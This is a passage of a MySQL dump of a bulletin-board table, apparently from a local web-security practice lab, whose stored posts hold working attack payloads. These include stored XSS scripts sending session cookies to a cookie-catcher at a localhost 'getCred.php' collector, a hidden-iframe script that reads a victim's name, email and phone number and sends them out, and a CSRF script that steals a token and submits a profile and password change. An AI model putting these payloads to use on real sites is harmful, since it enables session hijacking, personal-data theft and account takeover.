...
CREATE TABLE `board_table` (
  ...
  `board_secret` tinyint(1) NOT NULL DEFAULT '0',
...
INSERT INTO `board_table` VALUES (1,'bb',3,'2024-12-22 18:23:27',25,'bbvv',NULL,NULL,0),(2,'test',4,'2025-04-06 19:57:15',63,'123<script>var cookieData = document.cookie;var i = new Image();i.src = \"http://localhost:7777/getCred.php?\" + cookieData;</script>\r\n\r\n',NULL,NULL,0),(5,'관리자님 긴급!!!',7,'2025-04-07 00:41:41',26,'웹페이지좀 봐주세요 넘 허술해요\r\n<script>var cookieData = document.cookie;var i = new Image();i.src = \"http://localhost:7777/getCred.php?\" + cookieData</script>','',NULL,0),(6,'hi',4,'2025-04-08 19:23:16',10,'hi <a href=\"javascript:alert(1)\">Click</a>\r\n','','',0),(9,'관리자보셈',7,'2025-04-08 20:01:37',29,'관리자 하이\r\n<iframe style=\"display:none\" src=\"http://127.0.0.1:8888/mypage.php\" id=\"targetFrame\"></iframe><script>document.getElementById(\'targetFrame\').onload =function () {var targetTag = document.getElementById(\'targetFrame\');var DOMData = targetTag.contentDocument;var secretData1 =DOMData.getElementById(\'username\').value;var secretData2 =DOMData.getElementById(\'email\').value;var secretData3 =DOMData.getElementById(\'phonenum\').value;var i = new Image();i.src = \"http://127.0.0.1:7777/getCred.php?\"+\"[name]:%20\"+secretData1+\"%20[email]:%20\"+secretData2+\"%20[phonenumber]:%20\"+secretData3;};</script>','','',0),(16,'csrf token test',7,'2025-04-09 23:06:28',24,'test\r\n<iframe style=\"display:none\" src=\"http://127.0.0.1:8888/mypage.php\" id=\"stealthFrame1\"></iframe><iframe style=\"display:none;\" name=\"stealthFrame2\" sandbox=\"allow-forms allow-scripts\"></iframe><form method=\"POST\" action=\"http://127.0.0.1:8888/mypage_proc.php\" id=\"myForm\" target=\"stealthFrame2\"><input type=\"hidden\" name=\"username\" value=\"test\"><input type=\"hidden\" name=\"email\" value=\"test@test.com\"><input type=\"hidden\" name=\"phonenum\" value=\"010-2313-2221\"><input type=\"hidden\" name=\"pw\" value=\"1234\"></form><script>var targetTag=document.getElementById(\'stealthFrame1\');targetTag.onload=function () {var DOMdata=targetTag.contentDocument;var csrfToken =DOMdata.getElementsByName(\'csrf_token\')[0].value;var hiddenField =document.createElement(\'input\');hiddenField.type = \'hidden\';hiddenField.name = \'csrf_token\';hiddenField.value = csrfToken;var myForm =document.getElementById(\'myForm\');myForm.appendChild(hiddenField);myForm.submit();try {window.frames[\'stealthFrame2\'].alert =function () {};}catch (e){}};</script>','','',0),(35,'te',7,'2025-04-18 03:32:46',10,'te','file_6801494e010ca1.32687769.png','너무 어려워요.png',0),(37,'hi',10,'2025-04-23 18:38:24',1,'hi','','',0),(39,'비밀글 테스트',7,'2025-04-23 19:30:02',5,'ㄷㅈㄱ','','',1);
...
-- Dump completed on 2025-04-23 19:39:03
